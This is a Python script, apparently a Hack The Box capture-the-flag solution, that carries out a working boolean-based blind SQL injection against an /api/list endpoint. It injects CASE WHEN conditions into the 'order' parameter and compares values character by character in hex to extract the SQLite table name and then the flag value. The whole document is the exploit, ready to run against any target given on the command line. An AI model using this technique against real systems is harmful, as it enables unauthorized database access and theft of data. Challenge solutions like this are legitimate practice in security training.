import sys
import requests
import string
import re

if len(sys.argv) != 2:
    print("Usage: python3 emoji_flag.py <ip:port>")
    sys.exit(1)

host = sys.argv[1]
base_url = f"http://{host}/api/list"

def send(payload):
    try:
        r = requests.post(base_url, data={"order": payload}, timeout=5)
        return r.json()
    except Exception as e:
        print("[-] Request failed:", e)
        sys.exit(1)

def is_true(query):
    payload = f"(CASE WHEN ({query}) THEN id ELSE count END) ASC"
    res = send(payload)
    return res and res[0].get('id') == 1

# Dump table name
print(" Extracting table name...")
table_name = ""
i = 1
while True:
    found = False
    for c in string.printable:
        hex_char = format(ord(c), 'x').upper()
        query = f"""
        SELECT hex(substr((SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0), {i}, 1)) = '{hex_char}'
        """
        if is_true(query):
            table_name += c
            print(f"[+] Table: {table_name}")
            i += 1
            found = True
            break
    if not found:
        break

#Dump flag column value
print(f"[+] Extracting flag from table `{table_name.strip()}`...")
flag = ""
i = 1
while True:
    found = False
    for c in string.printable:
        hex_char = format(ord(c), 'x').upper()
        query = f"""
        SELECT hex(substr((SELECT flag FROM {table_name} LIMIT 1 OFFSET 0), {i}, 1)) = '{hex_char}'
        """
        if is_true(query):
            flag += c
            print(f" Flag: {flag}")
            i += 1
            found = True
            break
    if not found:
        break

# Final result
if re.match(r"HTB\{.*\}", flag):
    print("Final Flag:", flag)
else:
    print("Could not find valid flag format.")
